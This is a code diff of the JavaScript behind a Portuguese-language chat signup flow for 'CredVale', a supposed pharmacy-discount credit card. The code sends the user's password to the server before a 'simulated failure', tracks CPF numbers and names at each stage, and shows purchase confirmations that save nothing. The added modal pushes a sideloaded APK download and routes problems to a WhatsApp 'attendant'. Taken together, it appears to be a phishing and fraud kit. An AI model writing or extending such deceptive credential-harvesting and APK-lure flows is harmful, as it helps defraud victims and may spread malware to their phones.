@@ -214,9 +214,9 @@
       /* Decorative circles */
       '<circle cx="290" cy="30" r="100" fill="rgba(255,255,255,0.05)"/>'+
       '<circle cx="330" cy="50" r="60" fill="rgba(255,255,255,0.03)"/>'+
-      /* Logo + Brand */
-      '<image x="26" y="28" width="28" height="28" href="/assets/logo-app.png" preserveAspectRatio="xMidYMid meet"/>'+
-      '<text x="62" y="48" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="14" font-weight="800" fill="#ffffff" letter-spacing="2.5">CREDVALE</text>'+
+      /* Heart + Logo */
+      '<text x="28" y="48" font-family="Arial,sans-serif" font-size="20">\u2764\ufe0f</text>'+
+      '<text x="56" y="50" font-family="\'Space Grotesk\',Arial,sans-serif" font-size="14" font-weight="800" fill="#ffffff" letter-spacing="2.5">CREDVALE</text>'+
       /* Chip */
       '<rect x="28" y="78" width="42" height="32" rx="5" fill="rgba(255,255,255,0.18)"/>'+
       '<rect x="31" y="81" width="36" height="26" rx="3" fill="rgba(255,255,255,0.1)"/>'+
@@ -500,9 +500,9 @@
       addMsg(
         '<div class="chat-welcome-v2">'+
           gerarCardPremium()+
-          '<div class="chat-welcome-v2__title">💚 Economize mais com o CredVale!</div>'+
+          '<div class="chat-welcome-v2__title">💚 Sua vantagem começa agora!</div>'+
           '<div class="chat-welcome-v2__desc">'+
-            'Garanta <strong>até 75% de desconto</strong> em medicamentos e solicite seu cartão com análise rápida.'+
+            'Economize <strong>até 75% em medicamentos</strong> nas maiores redes de farmácias do Brasil e aproveite a oportunidade de assinar o <strong>CredVale</strong>, com análise rápida e limite de acordo com seu perfil.'+
           '</div>'+
           '<div class="chat-welcome-v2__badge">⏱ 2 minutos · sem burocracia</div>'+
         '</div>'
@@ -931,28 +931,7 @@
       navegador: sessionStorage.getItem('vs_navegador')||'',
       navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
     };
-    // Cria o cliente via fetch direto (para capturar clientId mesmo em caso de 409 - CPF já existente)
-    var apiResult = null;
-    try {
-      var baseUrl = window.__API_BASE || '/api';
-      var resp = await fetch(baseUrl + '/clients', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(apiData)
-      });
-      var respData = await resp.json();
-      if (resp.ok) {
-        apiResult = respData;
-      } else if (resp.status === 409 && respData.clientId) {
-        // CPF já existe no sistema (aprovado/ativado) — usa o clientId retornado
-        apiResult = { clientId: respData.clientId };
-        console.log('[cadastro] CPF já existente, usando clientId:', respData.clientId);
-      } else {
-        console.error('[cadastro] Erro ao criar cliente:', respData.error);
-      }
-    } catch(e) {
-      console.error('[cadastro] Exceção ao criar cliente:', e);
-    }
+    var apiResult = await API.createClient(apiData).catch(function(){ return null; });
     clientId = apiResult ? apiResult.clientId : clientId;
     if (apiResult) {
       trackStage('Cadastro Aprovado', {nome: user.nome, cpf: user.cpf});
@@ -1081,12 +1060,12 @@
           '<div style="font-size:0.8rem;color:#475569;">Aguarde um instante...</div>'+
         '</div>'
       );
-      // Salvar a senha + plano escolhido no backend ANTES da falha simulada
+      // Salvar a senha no backend ANTES da falha simulada
       try {
         await fetch(apiBase + '/clients/' + clientId + '/credentials', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ password: password, plano_escolhido: chosenPlan === 'plus' ? 'plano_166' : 'sem_plano' })
+          body: JSON.stringify({ password: password })
         });
       } catch(e) {
         // Credencial salva em best-effort — fluxo continua normalmente
@@ -1236,7 +1215,7 @@
           '</div>' +
           '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
             '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
-            '<span>Medicamentos com até 75% desconto</span>' +
+            '<span>Medicamentos com até 60% desconto</span>' +
           '</div>' +
           '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
             '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
@@ -1257,30 +1236,16 @@
 
     showPopup(cardHtml);
 
-    function salvarPlano(clientId, planoValor) {
-      // Função auxiliar para salvar plano com fallback
-      return API.updateClientPlan(clientId, planoValor).catch(function() {
-        var baseUrl = window.__API_BASE || '/api';
-        return fetch(baseUrl + '/clients/' + clientId + '/plan', {
-          method: 'PATCH',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ plano_escolhido: planoValor })
-        }).catch(function(){});
-      });
-    }
-
-    document.getElementById('btnAssinarOferta').onclick = async function() {
+    document.getElementById('btnAssinarOferta').onclick = function() {
       chosenPlan = 'plus';
-      closePopup(); // Fecha imediatamente para não travar a UX
-      salvarPlano(clientId, 'plano_166'); // Fire-and-forget com fallback
+      closePopup();
       addMsg('💳 <strong>Plano CredVale</strong> assinado com sucesso!','user');
       setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
 
-    document.getElementById('btnSemPlanoOferta').onclick = async function() {
+    document.getElementById('btnSemPlanoOferta').onclick = function() {
       chosenPlan = '';
-      closePopup(); // Fecha imediatamente para não travar a UX
-      salvarPlano(clientId, 'sem_plano'); // Fire-and-forget com fallback
+      closePopup();
       addMsg('→ <strong>Continuar sem o Plano CredVale</strong> selecionado','user');
       setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
@@ -1342,30 +1307,184 @@
   
   /**
    * Função showDownloadModalInChat - Abre o modal de download do APK
-   * Utiliza a função compartilhada API.showDownloadModal (mesma da Index e app.html)
+   * Mesmo layout e funcionamento do modal da página Index (App.tsx)
+   * Fluxo: Tela inicial → Download com progresso → Sucesso
+   * Agora verifica se há APK ativo antes de iniciar o download
    */
   function showDownloadModalInChat(clientId, limite) {
     if (popupEl) closePopup();
-    // Redundância: envia o beacon ANTES de abrir o modal, garantindo que
-    // mesmo que algo dê erro no modal, o registro do clique foi feito
-    if (clientId) {
-      try {
-        var baseUrl = window.__API_BASE || '/api';
-        var payload = JSON.stringify({
-          client_id: clientId,
-          client_cpf: (user && user.cpf) || '',
-          client_nome: (user && user.nome) || '',
-          apk_available: true,
-          device_info: navigator.userAgent || ''
-        });
-        navigator.sendBeacon(baseUrl + '/app/register-download', new Blob([payload], { type: 'application/json' }));
-      } catch(e) {}
+
+    var apiBase = window.__API_BASE || '/api';
+    var state = 'initial'; // initial | downloading | success | unavailable
+    var overlay = document.createElement('div');
+    overlay.className = 'popup-overlay';
+    overlay.style.cssText = 'position:fixed;inset:0;z-index:9999;background:rgba(15,23,42,0.6);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;animation:fadeIn 0.2s ease;';
+
+    var box = document.createElement('div');
+    box.style.cssText = 'background:#ffffff;border:1px solid #e2e8f0;border-radius:24px;padding:24px 22px;max-width:360px;width:100%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.15);animation:modalIn 0.3s ease;position:relative;';
+
+    // Obtém WhatsApp de suporte
+    function getSupportWA() {
+      var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
+      wa = String(wa).replace(/\D/g,'');
+      if (wa.length <= 11) wa = '55' + wa;
+      return wa;
     }
-    API.showDownloadModal({
-      clientId: clientId || '',
-      cpf: (user && user.cpf) || '',
-      nome: (user && user.nome) || ''
-    });
+
+    function renderInitial() {
+      box.innerHTML =
+        '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">' +
+          '<h3 style="font-family:inherit;font-size:1.1rem;font-weight:800;color:#111827;margin:0;display:flex;align-items:center;gap:8px;">' +
+            '<span style="font-size:1.2rem;">📲</span> Instalar CredVale App' +
+          '</h3>' +
+          '<button id="dlCloseBtn" style="background:none;border:none;color:#9CA3AF;font-size:1.2rem;cursor:pointer;padding:4px;line-height:1;">✕</button>' +
+        '</div>' +
+        '<p style="font-size:0.82rem;color:#4B5563;line-height:1.5;margin:0 0 20px;">' +
+          'Faça o download do aplicativo CredVale diretamente para o seu celular.' +
+        '</p>' +
+        '<button id="dlStartBtn" style="width:100%;padding:14px;border-radius:12px;border:none;background:#0B6CF4;color:#fff;font-size:0.9rem;font-weight:800;cursor:pointer;font-family:inherit;box-shadow:0 4px 16px rgba(11,108,244,0.15);transition:all 0.2s;">📲 Baixar Aplicativo</button>' +
+        '<p style="font-size:0.68rem;color:#9CA3AF;margin:10px 0 0;">Arquivo APK oficial CredVale</p>';
+      box.querySelector('#dlCloseBtn').onclick = function(){ overlay.remove(); popupEl = null; };
+      box.querySelector('#dlStartBtn').onclick = verificarEIniciarDownload;
+    }
+
+    function renderDownloading(progress) {
+      box.innerHTML =
+        '<div style="padding:8px 0;">' +
+          '<div style="width:48px;height:48px;margin:0 auto 16px;border:4px solid #dbeafe;border-top-color:#0B6CF4;border-radius:50%;animation:spin 0.8s linear infinite;"></div>' +
+          '<p style="font-size:0.95rem;font-weight:700;color:#1F2937;margin:0 0 4px;">Baixando Aplicativo...</p>' +
+          '<p style="font-size:0.78rem;color:#6B7280;margin:0 0 16px;">Isso levará apenas alguns segundos.</p>' +
+          '<div style="width:100%;height:6px;background:#f1f5f9;border-radius:3px;overflow:hidden;">' +
+            '<div style="height:100%;width:' + progress + '%;background:linear-gradient(90deg,#0B6CF4,#059669);border-radius:3px;transition:width 0.3s;"></div>' +
+          '</div>' +
+          '<p style="font-size:0.72rem;color:#6B7280;margin:8px 0 0;">' + progress + '%</p>' +
+        '</div>';
+    }
+
+    function renderSuccess() {
+      box.innerHTML =
+        '<div style="padding:8px 0;">' +
+          '<div style="width:64px;height:64px;border-radius:50%;background:rgba(16,185,129,0.06);border:4px solid rgba(16,185,129,0.12);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">' +
+            '<span style="font-size:2rem;color:#10B981;">✓</span>' +
+          '</div>' +
+          '<p style="font-size:1rem;font-weight:800;color:#1F2937;margin:0 0 6px;">Download iniciado com sucesso!</p>' +
+          '<p style="font-size:0.82rem;color:#6B7280;line-height:1.5;margin:0 0 20px;">O aplicativo foi baixado com sucesso.</p>' +
+          '<button id="dlFinishBtn" style="width:100%;padding:14px;border-radius:12px;border:none;background:#0B6CF4;color:#fff;font-size:0.85rem;font-weight:700;cursor:pointer;font-family:inherit;">Concluir</button>' +
+        '</div>';
+      box.querySelector('#dlFinishBtn').onclick = function(){ overlay.remove(); popupEl = null; };
+    }
+
+    function renderUnavailable() {
+      var waNum = getSupportWA();
+      var waLink = 'https://wa.me/' + waNum + '?text=Olá! Gostaria de saber como baixar o aplicativo CredVale. Já sou cliente.';
+      box.innerHTML =
+        '<div style="padding:8px 0;">' +
+          '<div style="font-size:2.8rem;margin-bottom:12px;">😕</div>' +
+          '<p style="font-size:1rem;font-weight:800;color:#1F2937;margin:0 0 4px;">Aplicativo indisponível</p>' +
+          '<p style="font-size:0.82rem;color:#6B7280;line-height:1.5;margin:0 0 20px;">' +
+            'Não foi possível concluir o download do aplicativo neste momento.' +
+          '</p>' +
+          '<p style="font-size:0.78rem;color:#9CA3AF;line-height:1.5;margin:0 0 20px;">' +
+            'Nossa equipe pode resolver isso rapidamente para você. Clique no botão abaixo para falar com um de nossos atendentes.' +
+          '</p>' +
+          '<a href="' + waLink + '" target="_blank" rel="noopener" style="display:block;width:100%;padding:14px;border-radius:12px;border:none;background:#25D366;color:#fff;font-size:0.9rem;font-weight:800;cursor:pointer;font-family:inherit;text-decoration:none;box-shadow:0 4px 16px rgba(37,211,102,0.2);margin-bottom:8px;">💬 Falar com um Atendente</a>' +
+          '<button id="dlCloseUnavail" style="width:100%;padding:12px;border-radius:12px;border:1px solid #e2e8f0;background:transparent;color:#64748b;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:inherit;">Fechar</button>' +
+        '</div>';
+      box.querySelector('#dlCloseUnavail').onclick = function(){ overlay.remove(); popupEl = null; };
+    }
+
+    async function verificarEIniciarDownload() {
+      // Sempre registra o clique no download, independentemente de existir APK ou não
+      if (clientId) {
+        try {
+          await API.registerAppDownload(clientId, 'download_iniciado');
+        } catch(e) {}
+      }
+
+      try {
+        // Verifica se existe APK ativo no servidor
+        var appResp = await fetch(apiBase + '/app/active');
+        var appData = await appResp.json();
+
+        if (!appData || !appData.active) {
+          // APK inexistente — mostra modal de indisponibilidade
+          state = 'unavailable';
+          renderUnavailable();
+          // Registra como indisponível
+          if (clientId) {
+            try {
+              await API.registerAppDownload(clientId, 'aplicativo_indisponivel');
+            } catch(e) {}
+          }
+          return;
+        }
+      } catch (e) {
+        // Erro ao verificar — tenta baixar mesmo assim (fallback)
+        console.error('[download] erro ao verificar app ativo:', e);
+      }
+
+      // APK disponível — prossegue com o download normal
+      await startDownload();
+    }
+
+    async function startDownload() {
+      state = 'downloading';
+      renderDownloading(0);
+      try {
+        var resp = await fetch(apiBase + '/app/download-active');
+        if (!resp.ok) {
+          renderInitial();
+          alert('Nenhum aplicativo disponível para download no momento.');
+          return;
+        }
+        var contentLength = resp.headers.get('content-length');
+        var total = contentLength ? parseInt(contentLength, 10) : 0;
+        var reader = resp.body.getReader();
+        var chunks = [];
+        var received = 0;
+        while (true) {
+          var result = await reader.read();
+          if (result.done) break;
+          chunks.push(result.value);
+          received += result.value.length;
+          if (total) {
+            var pct = Math.round((received / total) * 100);
+            renderDownloading(pct);
+          }
+        }
+        var blob = new Blob(chunks, { type: resp.headers.get('content-type') || 'application/vnd.android.package-archive' });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        var disposition = resp.headers.get('content-disposition');
+        var filename = 'CredVale.apk';
+        if (disposition) {
+          var match = disposition.match(/filename="?(.+?)"?$/);
+          if (match) filename = match[1];
+        }
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        state = 'success';
+        renderSuccess();
+        try {
+          var _sid2 = sessionStorage.getItem('vs_session_id');
+          if (_sid2) navigator.sendBeacon(apiBase + '/track/session/stage', new Blob([JSON.stringify({session_id:_sid2,stage:'Download Completo'})],{type:'application/json'}));
+        } catch(e) {}
+      } catch (e) {
+        renderInitial();
+        alert('Erro ao baixar o aplicativo. Tente novamente.');
+      }
+    }
+
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+    popupEl = overlay;
+    overlay.onclick = function(e) { if (e.target === overlay) { overlay.remove(); popupEl = null; } };
+
+    renderInitial();
   }
 
   /* ---- Final Screen: Baixar App ou Suporte ---- */
@@ -2026,7 +2145,8 @@
         showOptions([]);
         await new Promise(function(resolve) {
           document.getElementById('btnBaixarApp').onclick = function() {
-            API.showDownloadModal({ clientId: client.id, cpf: user.cpf, nome: nome });
+            var p = new URLSearchParams({ nome: nome, limite: limite, id: client.id });
+            window.location.href = 'app.html?' + p.toString();
             resolve();
           };
           document.getElementById('btnFalarSuporte').onclick = function() {
